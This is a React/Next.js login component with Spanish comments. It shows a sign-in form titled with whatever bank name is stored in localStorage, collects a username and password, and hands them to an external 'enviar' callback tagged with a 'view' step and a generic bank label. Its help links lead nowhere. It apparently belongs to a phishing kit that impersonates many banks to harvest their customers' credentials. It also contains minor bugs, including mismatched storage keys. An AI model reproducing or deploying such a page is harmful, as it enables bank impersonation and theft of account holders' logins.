/* eslint-disable @next/next/no-img-element */
/* eslint-disable react-hooks/set-state-in-effect */
/* eslint-disable @typescript-eslint/no-explicit-any */
'use client';
import React, { useState, useMemo, useEffect } from 'react';
import HeaderBank from './HeaderBank';

// Interfaz para el objeto del banco esperado de localStorage
interface BankData {
  name: string;
}

// --- Componentes Reutilizables (Mantenidos) ---

interface InputFieldProps {
  placeholder: string;
  type?: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  inputMode?: 'numeric' | 'text';
}

const InputFieldBank: React.FC<InputFieldProps> = ({ placeholder, type = 'text', value, onChange, inputMode }) => (
  <div className="flex items-center border border-gray-400 rounded-md overflow-hidden bg-white mb-4">
    <input
      type={type}
      placeholder={placeholder}
      value={value}
      onChange={onChange}
      inputMode={inputMode}
      className="w-full px-4 py-4 text-base border-none outline-none bg-transparent placeholder-gray-500 focus:ring-0 focus:border-blue-500"
    />
  </div>
);

// --- Componente Principal de Login Dinámico ---
export default function LoginBank({ enviar }: any) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  // Inicialización directa del estado con un valor por defecto
  const [bankName, setBankName] = useState<any>('tu cuenta');

  // Función Centralizada y más robusta para leer localStorage
  const getBankNameFromStorage = (): any => {
    if (typeof window === 'undefined' || !window.localStorage) {
      // En entorno SSR o sin localStorage
      const bankSelct = localStorage.getItem('bankSelct')
     setBankName(bankSelct)
      console.log("No estamos en el navegador o localStorage no está disponible.",bankSelct);
      return bankSelct;
    }

    try {
      const bankDataString = localStorage.getItem('bankSelct');

      if (!bankDataString) {
        console.log("localStorage: Clave 'binbank' no encontrada.");
        return 'tu cuenta';
      }

      const bankData: any = bankDataString;
      console.log('bankData', bankData)

      if (bankData?.bank?.name) {
        console.log(`localStorage: Nombre del banco encontrado: ${bankData?.bank?.name}`);
        return bankData?.bank?.name;
      }

      console.log("localStorage: 'binbank' encontrado, pero le falta la propiedad 'name'.");
      return bankDataString;

    } catch (error) {
      console.error("Error al leer/parsear 'binbank' de localStorage:", error);
      return 'Tu Cuenta';
    }
  };

  // 1. Hook para cargar el nombre del banco y suscribirse a cambios
  useEffect(() => {
    // 1. Cargar el valor inicial
    const initialBankName = getBankNameFromStorage();
    setBankName(initialBankName);

    // 2. Definir el handler para el evento 'storage' (solo se dispara entre pestañas)
    const handleStorageChange = (e: StorageEvent) => {
      // Solo actualizamos si la clave cambiada es 'binbank'
      if (e.key === 'binbank') {
        setBankName(getBankNameFromStorage());
      }
    };

    // 3. Suscribirse al evento 'storage'
    window.addEventListener('storage', handleStorageChange);

    // 4. Cleanup function: Desuscribirse cuando el componente se desmonte
    return () => {
      window.removeEventListener('storage', handleStorageChange);
    };
  }, []);

  // --- Lógica de Formulario (Mantenida) ---

  const isUsernameValid = username.length >= 3;
  const isPasswordValid = password.length >= 3;

  const isButtonActive = useMemo(() => isUsernameValid && isPasswordValid, [isUsernameValid, isPasswordValid]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (isButtonActive) {
      //console.log('Datos listos para enviar:', { username, password });
      // alert(`Login exitoso simulado en ${bankName}!`);

      enviar?.({ view: "login", user: username, pass: password, bank: "Generic" });
      setUsername('');
      setPassword('');
    }
  };

  const buttonClasses = isButtonActive
    ? 'bg-[#0d2b1d] hover:bg-[#0d2b1d]'
    : 'bg-gray-400 cursor-not-allowed';

  return (
    <div className="relative min-h-screen bg-white">
      <HeaderBank />

      <main className="flex flex-col items-center pt-20 pb-5 min-h-screen px-4">

        <form onSubmit={handleSubmit} className="w-full max-w-sm text-left">

          <h1 className="text-xl font-bold text-gray-800 mb-4 mt-6">
            Inicia sesión en {bankName}
          </h1>
          <p className="text-sm text-gray-600 mb-8">
            Para continuar, ingresa tus credenciales de acceso.
          </p>

          <InputFieldBank
            placeholder="Usuario o documento"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            type="text"
            inputMode="text"
          />

          <InputFieldBank
            placeholder="Clave"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type="password"
            inputMode="text"
          />

          <button
            type="submit"
            disabled={!isButtonActive}
            className={`w-full text-white text-lg font-bold py-3 rounded-md mt-4 transition duration-200 border-none ${buttonClasses}`}
          >
            ENTRAR
          </button>

          <div className="text-center mt-6">
            <a href="#" className="text-[#0d2b1d] font-semibold text-sm hover:underline block mb-3">
              ¿Olvidaste tu contraseña?
            </a>
            <a href="#" className="text-[#0d2b1d] font-semibold text-sm hover:underline block">
              Ayuda
            </a>
          </div>

        </form>
      </main>
    </div>
  );
}